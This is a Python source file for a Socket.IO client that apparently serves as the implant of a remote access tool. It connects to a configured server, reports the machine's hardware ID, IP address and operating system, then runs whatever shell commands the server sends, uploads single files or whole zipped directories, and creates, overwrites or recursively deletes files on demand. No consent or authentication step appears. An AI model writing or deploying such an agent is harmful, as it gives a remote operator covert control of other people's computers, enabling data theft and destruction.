import socketio
from command_handler import run_command
from utils.system_info import get_hwid, get_ip, get_os
from config import SERVER_URL 
import sys
import os
import zipfile
import io
import shutil

sio = socketio.Client()

@sio.event
def connect():
    print('Connection established')
    register_client()

@sio.event
def disconnect():
    print('Disconnected from server')


def connect_to_server():
    print("[*] Connecting to server...")
    sio.connect(SERVER_URL)
    sio.wait()

def register_client():
    client_info = {
        'hwid': get_hwid(),
        'ip': get_ip(),
        'os': get_os()
    }
    sio.emit("register", client_info)

@sio.on('destroy')
def destroy_connection():
    sio.disconnect()
    sys.exit(0)

@sio.on('sendCommand')
def handle_command(command):
    response = run_command(command)
    sio.emit("commandResponse", response)

@sio.on('receiveFile')
def receive_File(data):
    try:
        if 'filename' in data and 'fileBuffer' in data:
            filename = data['filename']
            filebuffer = data['fileBuffer']
            destination = data['destination']

            if not os.path.exists(destination):
                sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "Destination does not exist"})
                return

            file_path = os.path.join(destination, filename)

            with open(file_path, "wb") as f:
                f.write(filebuffer)

            sio.emit("receiveFileResponse", {"status": True, "filename": filename, "message": f"File {filename} received successfully"})
        else:
            sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "Expected keys 'filename' and 'fileBuffer' not found in the received data."})
    except Exception as e:
        sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "There was an error while receiving the file"})

@sio.on('requestFile')
def send_file(data):
    try:
        filepath = data['filePath']
        filename = data['filename']

        if not filepath or not filename:
            sio.emit("requestFileResponse", {"status": False, "filename": filename})
            return

        if filename == "*":
            zip_buffer = io.BytesIO()

            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(filepath):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, filepath)
                        zipf.write(file_path, arcname)

            zip_buffer.seek(0)

            sio.emit("requestFileResponse", {
                "status": True,
                "filename": "all_files.zip",
                "fileBuffer": zip_buffer.getvalue()
            })

        else:
            full_file_path = os.path.join(filepath, filename)
            if os.path.exists(full_file_path):
                with open(full_file_path, "rb") as f:
                    filebuffer = f.read()
                    sio.emit("requestFileResponse", {
                        "status": True,
                        "filename": filename,
                        "fileBuffer": filebuffer
                    })
            else:
                sio.emit("requestFileResponse", {"status": False, "filename": filename})

    except Exception as e:
        sio.emit("requestFileResponse", {"status": False, "filename": filename})

@sio.on("createFile")
def handle_create_file(data):
    file_path = data.get("filePath")
    content = data.get("content")
    
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        sio.emit("createFileResponse", {"status": True})
    except Exception as e:
        sio.emit("createFileResponse", {"status": False})

@sio.on("readFile")
def handle_read_file(data):
    file_path = data.get("filePath")
    
    if not os.path.exists(file_path):
        sio.emit("readFileResponse", {"status": False})
        return
    
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
        sio.emit("readFileResponse", {"status": True, "content": content})
    except Exception as e:
        sio.emit("readFileResponse", {"status": False})

@sio.on("updateFile")
def handle_update_file(data):
    file_path = data.get("filePath")
    content = data.get("content")
    
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        sio.emit("updateFileResponse", {"status": True})
    except Exception as e:
        sio.emit("updateFileResponse", {"status": False})

@sio.on("deleteFile")
def handle_delete_file(data):
    file_path = data.get("filePath")
    
    try:
        if os.path.exists(file_path):
            if os.path.isdir(file_path):  
                shutil.rmtree(file_path)  
            else:
                os.remove(file_path)  
            sio.emit("deleteFileResponse", {"status": True})
        else:
            sio.emit("deleteFileResponse", {"status": False, "message": "File/Folder not found"})
    except Exception as e:
        sio.emit("deleteFileResponse", {"status": False, "message": str(e)})